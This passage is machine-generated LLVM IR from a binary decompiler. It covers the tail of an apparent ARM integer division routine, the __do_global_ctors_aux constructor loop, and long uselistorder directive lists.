  %v1_11d18 = phi i32 [ %v0_11d0c, %bb79 ], [ %v2_11d10, %bb80 ]
  %v1_11d14 = add i32 %v4_11d20, -1
  %v7_11d14 = icmp eq i32 %v4_11d20, 1
  br i1 %v7_11d14, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_11d18 = icmp eq i32 %v1_11d18, %v4_11d20
  br i1 %v10_11d18, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_11d18 = icmp ult i32 %v1_11d18, %v4_11d20
  br i1 %v4_11d18, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_11d20 = and i32 %v1_11d14, %v4_11d20
  %v8_11d20 = icmp eq i32 %v6_11d20, 0
  br i1 %v8_11d20, label %.thread72, label %dec_label_pc_11d30.preheader

dec_label_pc_11d30.preheader:                     ; preds = %bb84
  %v2_11d30109 = icmp ugt i32 %v4_11d20, 268435455
  br i1 %v2_11d30109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_11d2464 = phi i32 [ %v1_11d18, %bb84 ], [ 0, %.thread70 ]
  %v3_11d24 = and i32 %v1_11d2464, %v1_11d14
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_11d30.preheader
  %v0_11d44.pr35.lcssa = phi i32 [ %v4_11d20, %dec_label_pc_11d30.preheader ], [ %v4_11d38, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11d30.preheader ], [ %v2_11d3c9, %.thread2.thread7 ]
  br label %dec_label_pc_11d44thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_11d30.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_11d3c9, %.thread2.thread7 ], [ 0, %dec_label_pc_11d30.preheader ]
  %v0_11d44.pr35110 = phi i32 [ %v4_11d38, %.thread2.thread7 ], [ %v4_11d20, %dec_label_pc_11d30.preheader ]
  %v4_11d34 = icmp ult i32 %v0_11d44.pr35110, %v1_11d18
  br i1 %v4_11d34, label %bb86, label %dec_label_pc_11d44thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_11d38 = and i32 %v0_11d44.pr35110, 268435456
  %v3_11d38 = icmp eq i32 %v2_11d38, 0
  %v4_11d38 = mul i32 %v0_11d44.pr35110, 16
  br i1 %v3_11d38, label %.thread2.thread7, label %dec_label_pc_11d44.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_11d3c9 = add i32 %storemerge111, 4
  %v2_11d30 = icmp ugt i32 %v4_11d38, 268435455
  br i1 %v2_11d30, label %.thread1, label %bb85

dec_label_pc_11d44thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_11d44thread-pre-split.loopexit

dec_label_pc_11d44thread-pre-split.loopexit:      ; preds = %dec_label_pc_11d44thread-pre-split.loopexit.loopexit, %.thread1
  %v0_11d44.pr35108 = phi i32 [ %v0_11d44.pr35.lcssa, %.thread1 ], [ %v0_11d44.pr35110, %dec_label_pc_11d44thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_11d44thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11d44thread-pre-split

dec_label_pc_11d44thread-pre-split:               ; preds = %.thread4, %dec_label_pc_11d44thread-pre-split.loopexit
  %v1_11d5041 = phi i32 [ %storemerge105, %dec_label_pc_11d44thread-pre-split.loopexit ], [ %v2_11d50, %.thread4 ]
  %v2_11d4836 = phi i32 [ %v1_11d18, %dec_label_pc_11d44thread-pre-split.loopexit ], [ %v2_11d48, %.thread4 ]
  %v0_11d44.pr = phi i32 [ %v0_11d44.pr35108, %dec_label_pc_11d44thread-pre-split.loopexit ], [ %v3_11d4c, %.thread4 ]
  br label %dec_label_pc_11d44

dec_label_pc_11d44.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_11d44

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d44.loopexit, %dec_label_pc_11d44thread-pre-split
  %v0_11d58.pr = phi i32 [ %v1_11d5041, %dec_label_pc_11d44thread-pre-split ], [ %storemerge111, %dec_label_pc_11d44.loopexit ]
  %v2_11d48 = phi i32 [ %v2_11d4836, %dec_label_pc_11d44thread-pre-split ], [ %v1_11d18, %dec_label_pc_11d44.loopexit ]
  %v1_11d4c = phi i32 [ %v0_11d44.pr, %dec_label_pc_11d44thread-pre-split ], [ %v4_11d38, %dec_label_pc_11d44.loopexit ]
  %v2_11d44 = icmp slt i32 %v1_11d4c, 0
  br i1 %v2_11d44, label %dec_label_pc_11d58, label %bb87

bb87:                                             ; preds = %dec_label_pc_11d44
  %v4_11d48 = icmp ult i32 %v1_11d4c, %v2_11d48
  br i1 %v4_11d48, label %.thread4, label %dec_label_pc_11d58

.thread4:                                         ; preds = %bb87
  %v3_11d4c = mul i32 %v1_11d4c, 2
  %v2_11d50 = add i32 %v0_11d58.pr, 1
  br label %dec_label_pc_11d44thread-pre-split

dec_label_pc_11d58:                               ; preds = %bb87, %dec_label_pc_11d44
  %v2_11d58 = add i32 %v0_11d58.pr, -3
  %v5_11d5c = icmp slt i32 %v0_11d58.pr, 3
  br i1 %v5_11d5c, label %dec_label_pc_11d9c, label %dec_label_pc_11d60

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d58, %bb91
  %v6_11d88 = phi i32 [ %v0_11d90, %bb91 ], [ %v2_11d58, %dec_label_pc_11d58 ]
  %v1_11d64 = phi i32 [ %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, %bb91 ], [ %v2_11d48, %dec_label_pc_11d58 ]
  %v3_11d8410 = phi i32 [ %v3_11d84, %bb91 ], [ %v1_11d4c, %dec_label_pc_11d58 ]
  %v3_11d60 = icmp ult i32 %v1_11d64, %v3_11d8410
  %v3_11d64 = select i1 %v3_11d60, i32 0, i32 %v3_11d8410
  %v1_11d6c = sub i32 %v1_11d64, %v3_11d64
  %v4_11d68 = udiv i32 %v3_11d8410, 2
  %v6_11d68 = icmp ult i32 %v1_11d6c, %v4_11d68
  %v6_11d6c = select i1 %v6_11d68, i32 0, i32 %v4_11d68
  %v1_11d6c.v6_11d6c = sub i32 %v1_11d6c, %v6_11d6c
  %.demorgan = and i1 %v3_11d60, %v6_11d68
  %v4_11d70 = udiv i32 %v3_11d8410, 4
  %v6_11d70 = icmp ult i32 %v1_11d6c.v6_11d6c, %v4_11d70
  %v6_11d74 = select i1 %v6_11d70, i32 0, i32 %v4_11d70
  %v1_11d6c.v6_11d6c.v6_11d74 = sub i32 %v1_11d6c.v6_11d6c, %v6_11d74
  %.demorgan76 = and i1 %.demorgan, %v6_11d70
  %v4_11d78 = udiv i32 %v3_11d8410, 8
  %v6_11d78 = icmp ult i32 %v1_11d6c.v6_11d6c.v6_11d74, %v4_11d78
  %v6_11d7c = select i1 %v6_11d78, i32 0, i32 %v4_11d78
  %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c = sub i32 %v1_11d6c.v6_11d6c.v6_11d74, %v6_11d7c
  %.demorgan77 = and i1 %.demorgan76, %v6_11d78
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_11d60
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_11d60, %bb88
  %v2_11d80 = add i32 %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, -1
  %v4_11d80 = sub i32 0, %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c
  %v5_11d80 = and i32 %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, %v4_11d80
  %v3_11d84 = udiv i32 %v3_11d8410, 16
  %v5_11d88 = icmp slt i32 %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, 1
  br i1 %v5_11d88, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_11d88 = add i32 %v6_11d88, -4
  %v9_11d88 = sub i32 3, %v6_11d88
  %v10_11d88 = and i32 %v9_11d88, %v6_11d88
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_11d90 = phi i32 [ %v6_11d88, %bb89 ], [ %v7_11d88, %bb90 ]
  %v0_11d8c13.in = phi i32 [ %v2_11d80, %bb89 ], [ %v7_11d88, %bb90 ]
  %v1_11d8c12.in = phi i32 [ %v5_11d80, %bb89 ], [ %v10_11d88, %bb90 ]
  %v1_11d8c12 = icmp slt i32 %v1_11d8c12.in, 0
  %v0_11d8c13 = icmp slt i32 %v0_11d8c13.in, 0
  %v2_11d8c = xor i1 %v0_11d8c13, %v1_11d8c12
  br i1 %v2_11d8c, label %dec_label_pc_11d90, label %dec_label_pc_11d60

dec_label_pc_11d90:                               ; preds = %bb91
  %v1_11d90 = urem i32 %v0_11d90, 4
  %v2_11d90 = icmp eq i32 %v1_11d90, 0
  br i1 %v2_11d90, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_11d90
  %v3_11d94 = icmp eq i32 %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, 0
  br i1 %v3_11d94, label %.thread6, label %dec_label_pc_11d9c

dec_label_pc_11d9c:                               ; preds = %bb92, %dec_label_pc_11d58
  %v0_11db0 = phi i32 [ %v3_11d84, %bb92 ], [ %v1_11d4c, %dec_label_pc_11d58 ]
  %v1_11dac = phi i32 [ %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, %bb92 ], [ %v2_11d48, %dec_label_pc_11d58 ]
  %v0_11d9c = phi i32 [ %v0_11d90, %bb92 ], [ %v2_11d58, %dec_label_pc_11d58 ]
  %v5_11da0 = icmp slt i32 %v0_11d9c, -2
  br i1 %v5_11da0, label %dec_label_pc_11dc0, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d9c
  %v8_11d9c = icmp eq i32 %v0_11d9c, -2
  br i1 %v8_11d9c, label %dec_label_pc_11db4, label %dec_label_pc_11da8

dec_label_pc_11da8:                               ; preds = %dec_label_pc_11da4
  %v3_11da8 = icmp ult i32 %v1_11dac, %v0_11db0
  br i1 %v3_11da8, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_11da8
  %v2_11da8 = sub i32 %v1_11dac, %v0_11db0
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_11da8, %bb93
  %v0_11db454 = phi i32 [ %v1_11dac, %dec_label_pc_11da8 ], [ %v2_11da8, %bb93 ]
  %v3_11db0 = udiv i32 %v0_11db0, 2
  br label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11da4, %bb94
  %v0_11dbc = phi i32 [ %v0_11db0, %dec_label_pc_11da4 ], [ %v3_11db0, %bb94 ]
  %v1_11db8 = phi i32 [ %v1_11dac, %dec_label_pc_11da4 ], [ %v0_11db454, %bb94 ]
  %v3_11db4 = icmp ult i32 %v1_11db8, %v0_11dbc
  br i1 %v3_11db4, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_11db4
  %v2_11db4 = sub i32 %v1_11db8, %v0_11dbc
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_11db4, %bb95
  %v0_11dc057 = phi i32 [ %v1_11db8, %dec_label_pc_11db4 ], [ %v2_11db4, %bb95 ]
  %v3_11dbc = udiv i32 %v0_11dbc, 2
  br label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11d9c, %bb96
  %v2_11dc4 = phi i32 [ %v0_11db0, %dec_label_pc_11d9c ], [ %v3_11dbc, %bb96 ]
  %v1_11dc4 = phi i32 [ %v1_11dac, %dec_label_pc_11d9c ], [ %v0_11dc057, %bb96 ]
  %v3_11dc0 = icmp ult i32 %v1_11dc4, %v2_11dc4
  br i1 %v3_11dc0, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_11dc0
  %v2_11dc0 = sub i32 %v1_11dc4, %v2_11dc4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11dc0, %bb83, %.thread72, %dec_label_pc_11d90, %bb92, %bb97
  %v1_11dcc = phi i32 [ %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, %dec_label_pc_11d90 ], [ 0, %bb92 ], [ %v1_11dc4, %dec_label_pc_11dc0 ], [ %v2_11dc0, %bb97 ], [ %v3_11d24, %.thread72 ], [ %v1_11d18, %bb83 ]
  br i1 %v1_11d0c, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_11dcc = sub i32 0, %v1_11dcc
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_11dd0 = phi i32 [ %v1_11dcc, %.thread6 ], [ %v2_11dcc, %bb98 ]
  ret i32 %v1_11dd0

dec_label_pc_11dd4:                               ; preds = %entry
  %v0_11dd4 = load i32, i32* @lr, align 4
  %v0_11dd8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11dd4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_11db0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11d90, { 1, 0, 2 }
  uselistorder i32 %v7_11d88, { 1, 0 }
  uselistorder i32 %v3_11d84, { 1, 0 }
  uselistorder i32 %v1_11d6c.v6_11d6c.v6_11d74.v6_11d7c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_11d78, { 1, 0 }
  uselistorder i32 %v4_11d70, { 1, 0 }
  uselistorder i32 %v4_11d68, { 1, 0 }
  uselistorder i32 %v6_11d88, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11d58, { 1, 0 }
  uselistorder i32 %v1_11d4c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_11d48, { 1, 0, 3, 2 }
  uselistorder i32 %v4_11d38, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11d44.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11d18, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_11d20, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 0, 1 }
  uselistorder i32* @lr, { 39, 40, 8, 9, 10, 11, 13, 12, 0, 14, 15, 1, 16, 17, 18, 3, 20, 21, 19, 41, 42, 43, 44, 45, 22, 23, 46, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 2, 47, 48, 49, 4, 51, 52, 53, 54, 80, 55, 36, 37, 38, 57, 58, 59, 56, 34, 35, 60, 61, 62, 63, 64, 65, 66, 67, 68, 76, 69, 70, 71, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 5, 91, 92, 93, 6, 94, 95, 96, 7, 97, 98, 99, 100, 101, 102, 103, 104, 105, 72, 106, 107, 108, 73, 74, 75, 50, 79, 77, 78 }
  uselistorder i32 -2, { 0, 7, 2, 3, 11, 8, 9, 13, 12, 14, 5, 6, 4, 15, 16, 1, 10, 17 }
  uselistorder i32 8, { 3, 44, 24, 4, 5, 14, 6, 20, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 22, 59, 45, 60, 61, 86, 87, 88, 89, 62, 90, 63, 91, 64, 65, 46, 66, 67, 68, 69, 21, 70, 41, 42, 71, 72, 73, 31, 74, 75, 76, 77, 27, 16, 17, 78, 79, 43, 92, 93, 94, 95, 96, 97, 98, 0, 1, 99, 100, 101, 102, 103, 7, 104, 80, 39, 40, 47, 129, 105, 106, 107, 108, 81, 109, 110, 23, 111, 112, 128, 130, 32, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 33, 146, 25, 82, 8, 114, 113, 83, 84, 30, 121, 120, 118, 119, 122, 123, 124, 125, 126, 127, 9, 115, 116, 2, 36, 37, 34, 35, 18, 19, 28, 29, 38, 147, 10, 48, 26, 11, 12, 15, 13, 85, 117 }
  uselistorder i32 3, { 30, 18, 48, 31, 43, 0, 1, 2, 13, 3, 4, 44, 11, 22, 45, 14, 46, 5, 23, 24, 49, 19, 50, 51, 20, 52, 53, 15, 26, 25, 32, 8, 7, 6, 9, 54, 27, 55, 33, 34, 59, 35, 36, 37, 38, 39, 40, 10, 12, 47, 60, 17, 56, 57, 16, 41, 21, 58, 42, 28, 29 }
  uselistorder i32 -3, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 94, 6, 7, 8, 9, 10, 97, 98, 45, 99, 43, 100, 101, 11, 102, 103, 46, 12, 13, 47, 114, 104, 105, 75, 14, 15, 16, 86, 17, 76, 106, 71, 70, 18, 107, 108, 109, 19, 115, 63, 64, 117, 87, 88, 116, 65, 118, 119, 120, 121, 122, 44, 78, 110, 20, 112, 111, 123, 124, 125, 21, 95, 48, 49, 50, 51, 52, 53, 126, 127, 128, 89, 90, 91, 22, 92, 54, 55, 72, 56, 73, 57, 138, 139, 69, 140, 141, 60, 142, 59, 143, 58, 79, 23, 61, 24, 93, 66, 113, 42, 25, 144, 67, 129, 26, 80, 130, 131, 27, 81, 132, 133, 77, 62, 28, 0, 29, 30, 31, 32, 33, 96, 34, 35, 36, 37, 38, 82, 68, 83, 39, 40, 136, 74, 134, 41, 135, 137, 84, 85 }
  uselistorder i32 4, { 8, 9, 66, 185, 186, 132, 10, 11, 136, 137, 138, 139, 140, 12, 141, 13, 142, 143, 144, 145, 79, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 187, 188, 189, 156, 157, 14, 15, 190, 191, 80, 88, 16, 89, 90, 91, 92, 93, 158, 17, 159, 94, 160, 161, 162, 163, 164, 165, 166, 95, 167, 168, 169, 170, 171, 172, 51, 175, 96, 97, 174, 133, 173, 192, 98, 99, 100, 193, 194, 195, 196, 197, 198, 199, 0, 18, 61, 200, 201, 202, 203, 204, 205, 206, 60, 207, 101, 102, 103, 208, 210, 81, 211, 68, 212, 260, 19, 20, 1, 183, 213, 214, 82, 215, 216, 217, 218, 83, 104, 105, 106, 107, 108, 109, 219, 110, 111, 220, 221, 84, 112, 21, 22, 2, 78, 69, 70, 23, 261, 71, 63, 24, 25, 72, 73, 262, 263, 264, 265, 74, 266, 267, 268, 269, 75, 270, 271, 272, 273, 274, 26, 275, 276, 277, 278, 279, 76, 62, 280, 281, 282, 283, 284, 285, 27, 28, 77, 286, 287, 288, 289, 290, 113, 29, 176, 114, 177, 115, 64, 178, 226, 116, 227, 228, 3, 222, 223, 224, 225, 117, 118, 179, 119, 4, 120, 180, 30, 181, 65, 121, 122, 238, 240, 239, 236, 237, 241, 242, 243, 244, 245, 246, 247, 248, 249, 123, 124, 125, 126, 229, 230, 231, 232, 233, 234, 5, 31, 235, 209, 32, 127, 52, 33, 34, 35, 36, 67, 251, 252, 134, 37, 38, 53, 54, 55, 39, 182, 40, 41, 56, 42, 43, 44, 45, 128, 46, 184, 47, 57, 48, 250, 49, 50, 85, 58, 129, 86, 130, 59, 131, 253, 254, 255, 256, 257, 258, 6, 7, 259, 87, 135 }
  uselistorder i32 16, { 3, 4, 5, 21, 6, 7, 1, 8, 9, 40, 41, 42, 43, 26, 44, 45, 46, 47, 64, 65, 48, 49, 50, 51, 27, 52, 66, 67, 68, 53, 54, 55, 56, 57, 58, 39, 69, 70, 71, 72, 0, 73, 74, 10, 11, 75, 76, 12, 77, 78, 91, 79, 80, 81, 82, 59, 83, 23, 13, 84, 85, 28, 29, 30, 92, 31, 93, 94, 32, 95, 96, 33, 97, 98, 99, 100, 101, 102, 25, 62, 34, 60, 86, 61, 87, 88, 24, 14, 15, 16, 22, 17, 18, 2, 19, 20, 63, 35, 89, 90, 36, 37, 38 }
  uselistorder i32 268435455, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11dc0, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11db4, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_11d60, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11de8 = load i32, i32* @global_var_1b4e4.175, align 4
  %v7_11dec = icmp eq i32 %v3_11de8, -1
  %v3_11df0 = load i32, i32* @r4, align 4
  store i32 %v3_11df0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1b4e4.175 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_11dec, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_11df0, i32* %r4.global-to-local, align 4
  %v9_11df8 = load i32, i32* @r0, align 4
  ret i32 %v9_11df8

.preheader:                                       ; preds = %entry, %.preheader
  %v0_11e00 = phi i32 [ %v3_11e04, %.preheader ], [ %v3_11de8, %entry ]
  call void @__pseudo_branch(i32 %v0_11e00)
  %v0_11e04 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e04 = add i32 %v0_11e04, -4
  %v2_11e04 = inttoptr i32 %v1_11e04 to i32*
  %v3_11e04 = load i32, i32* %v2_11e04, align 4
  store i32 %v1_11e04, i32* %r4.global-to-local, align 4
  %v3_11e08 = icmp eq i32 %v3_11e04, -1
  br i1 %v3_11e08, label %dec_label_pc_11e10, label %.preheader

dec_label_pc_11e10:                               ; preds = %.preheader
  %v2_11e10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11e10, i32* %r4.global-to-local, align 4
  %v8_11e10 = load i32, i32* @r0, align 4
  ret i32 %v8_11e10

; uselistorder directives
  uselistorder i32 %v3_11e04, { 1, 0 }
  uselistorder i32 %v3_11de8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 55, 11, 12, 44, 13, 9, 45, 10, 2, 46, 47, 48, 14, 22, 56, 57, 58, 6, 23, 24, 25, 59, 60, 61, 7, 26, 27, 28, 62, 63, 64, 8, 29, 30, 65, 21, 20, 66, 67, 68, 19, 18, 17, 16, 31, 32, 33, 34, 35, 3, 36, 4, 37, 5, 69, 15, 38, 49, 50, 51, 52, 53, 54, 39, 40, 0, 41, 1, 42, 43 }
  uselistorder i32 -1, { 146, 0, 147, 148, 149, 207, 63, 208, 150, 151, 209, 210, 64, 248, 211, 152, 60, 30, 153, 212, 1, 31, 154, 53, 213, 156, 214, 215, 61, 54, 55, 216, 217, 218, 219, 220, 56, 126, 221, 120, 155, 127, 222, 223, 224, 157, 128, 129, 2, 225, 3, 158, 226, 227, 130, 4, 40, 41, 5, 249, 159, 228, 160, 65, 124, 66, 250, 251, 161, 229, 162, 131, 230, 32, 231, 232, 132, 6, 163, 164, 115, 121, 119, 7, 122, 10, 8, 9, 123, 133, 233, 234, 165, 166, 33, 235, 67, 276, 68, 252, 125, 11, 253, 69, 12, 13, 70, 236, 14, 15, 16, 76, 74, 71, 237, 111, 112, 75, 73, 72, 134, 238, 254, 167, 168, 62, 34, 169, 17, 47, 57, 58, 255, 170, 18, 35, 256, 77, 257, 78, 258, 79, 171, 48, 80, 20, 21, 136, 42, 43, 135, 259, 50, 49, 44, 45, 172, 116, 117, 173, 174, 19, 260, 175, 176, 177, 178, 179, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 180, 81, 241, 82, 273, 83, 294, 295, 84, 266, 85, 296, 86, 297, 87, 298, 88, 299, 89, 300, 90, 301, 22, 181, 23, 247, 137, 138, 24, 239, 52, 182, 25, 240, 183, 139, 184, 26, 27, 51, 36, 37, 185, 186, 187, 46, 242, 188, 243, 28, 91, 261, 92, 262, 93, 270, 94, 268, 95, 269, 140, 263, 96, 264, 189, 97, 190, 38, 39, 191, 98, 272, 99, 244, 100, 274, 101, 271, 102, 245, 103, 277, 104, 275, 105, 278, 106, 267, 107, 265, 108, 246, 109, 302, 59, 303, 192, 193, 194, 195, 118, 110, 141, 113, 142, 143, 29, 196, 197, 198, 199, 200, 201, 202, 203, 204, 114, 205, 206, 144, 145 }
  uselistorder i32* @global_var_1b4e4.175, { 1, 0 }
  uselistorder i32 1, { 457, 212, 396, 781, 782, 783, 324, 784, 141, 21, 349, 408, 673, 458, 64, 62, 61, 65, 63, 674, 675, 460, 459, 251, 253, 252, 250, 254, 461, 113, 676, 350, 677, 351, 362, 678, 409, 679, 680, 410, 338, 363, 335, 390, 391, 681, 411, 682, 683, 684, 685, 364, 686, 325, 687, 688, 412, 689, 690, 474, 473, 472, 471, 470, 469, 468, 467, 466, 465, 464, 463, 462, 448, 49, 41, 44, 46, 40, 38, 39, 48, 43, 42, 47, 36, 37, 45, 52, 50, 51, 691, 692, 449, 475, 15, 13, 18, 20, 16, 17, 14, 19, 693, 694, 695, 696, 336, 697, 698, 699, 476, 148, 149, 146, 150, 147, 785, 786, 787, 788, 789, 790, 477, 299, 300, 301, 298, 478, 151, 700, 701, 479, 170, 791, 792, 413, 480, 106, 107, 104, 108, 103, 105, 702, 482, 481, 67, 66, 68, 69, 365, 397, 485, 484, 483, 793, 794, 795, 796, 797, 798, 799, 486, 307, 308, 306, 303, 302, 304, 305, 800, 414, 801, 802, 487, 126, 125, 124, 122, 128, 123, 127, 803, 804, 805, 806, 703, 704, 488, 255, 352, 705, 706, 102, 101, 415, 489, 416, 807, 808, 809, 810, 811, 812, 490, 450, 81, 80, 82, 386, 707, 418, 708, 709, 366, 367, 710, 711, 419, 712, 714, 715, 716, 420, 718, 368, 719, 717, 417, 720, 421, 721, 387, 722, 723, 713, 494, 493, 492, 491, 215, 217, 218, 214, 223, 216, 220, 222, 221, 224, 219, 724, 495, 256, 258, 257, 261, 260, 259, 496, 204, 203, 725, 726, 727, 497, 111, 112, 389, 341, 729, 342, 730, 369, 731, 732, 734, 329, 735, 422, 736, 343, 733, 381, 505, 504, 503, 502, 501, 500, 499, 498, 53, 56, 55, 57, 54, 423, 353, 506, 33, 34, 35, 728, 398, 451, 813, 814, 815, 816, 817, 11, 10, 7, 9, 6, 5, 12, 8, 508, 507, 509, 818, 262, 819, 370, 820, 821, 822, 399, 823, 824, 825, 424, 425, 826, 827, 510, 263, 264, 268, 267, 266, 265, 511, 828, 512, 157, 156, 155, 158, 829, 513, 89, 90, 830, 831, 832, 833, 514, 226, 227, 737, 738, 739, 740, 741, 742, 743, 744, 745, 517, 516, 515, 205, 206, 207, 746, 747, 748, 749, 750, 521, 520, 519, 518, 186, 185, 191, 187, 190, 189, 188, 192, 193, 184, 194, 371, 834, 835, 372, 836, 837, 838, 839, 840, 426, 841, 842, 843, 844, 846, 523, 522, 94, 92, 96, 93, 97, 98, 99, 91, 95, 344, 851, 847, 848, 849, 850, 383, 524, 58, 59, 60, 526, 525, 269, 270, 993, 527, 852, 528, 769, 770, 771, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 529, 120, 121, 114, 115, 116, 117, 119, 118, 354, 871, 868, 869, 870, 330, 355, 133, 136, 132, 134, 135, 872, 873, 874, 875, 876, 877, 530, 165, 163, 166, 164, 167, 168, 373, 878, 879, 427, 880, 532, 531, 228, 229, 230, 534, 533, 180, 179, 535, 271, 428, 751, 752, 536, 273, 272, 274, 994, 400, 995, 537, 276, 275, 131, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 356, 895, 540, 539, 538, 279, 278, 277, 281, 280, 896, 897, 898, 899, 900, 542, 541, 142, 143, 543, 28, 902, 374, 901, 357, 331, 904, 375, 903, 0, 907, 908, 909, 910, 546, 545, 544, 172, 173, 911, 912, 913, 914, 915, 401, 916, 917, 402, 919, 429, 920, 392, 393, 405, 1, 403, 404, 921, 918, 430, 922, 388, 553, 552, 452, 551, 550, 453, 549, 548, 547, 345, 385, 959, 960, 961, 962, 963, 376, 554, 239, 772, 773, 774, 555, 284, 285, 283, 282, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 197, 195, 196, 198, 199, 996, 358, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 454, 557, 556, 242, 243, 245, 249, 246, 241, 244, 240, 248, 247, 558, 286, 559, 287, 560, 109, 110, 561, 153, 154, 4, 562, 288, 563, 152, 564, 289, 565, 290, 566, 171, 2, 570, 569, 568, 567, 129, 130, 431, 571, 377, 432, 572, 100, 573, 574, 346, 775, 776, 337, 777, 575, 295, 292, 294, 293, 297, 296, 291, 778, 347, 753, 576, 23, 25, 26, 24, 27, 232, 231, 941, 328, 378, 942, 578, 577, 84, 85, 83, 86, 87, 579, 75, 71, 76, 73, 72, 74, 580, 234, 236, 235, 237, 238, 233, 581, 582, 583, 585, 584, 1009, 379, 588, 587, 586, 309, 310, 589, 30, 31, 29, 32, 590, 161, 162, 160, 159, 591, 183, 182, 380, 948, 592, 200, 201, 433, 434, 339, 596, 595, 594, 593, 175, 174, 597, 311, 598, 181, 599, 213, 600, 312, 601, 144, 435, 943, 340, 944, 945, 436, 946, 605, 604, 603, 602, 208, 210, 211, 209, 606, 607, 766, 332, 78, 77, 79, 359, 845, 906, 905, 666, 667, 668, 669, 670, 671, 672, 1010, 138, 140, 137, 139, 754, 608, 88, 609, 313, 610, 70, 611, 202, 612, 314, 613, 315, 614, 316, 615, 317, 616, 318, 617, 145, 618, 319, 323, 225, 406, 986, 987, 326, 966, 755, 333, 348, 756, 757, 758, 327, 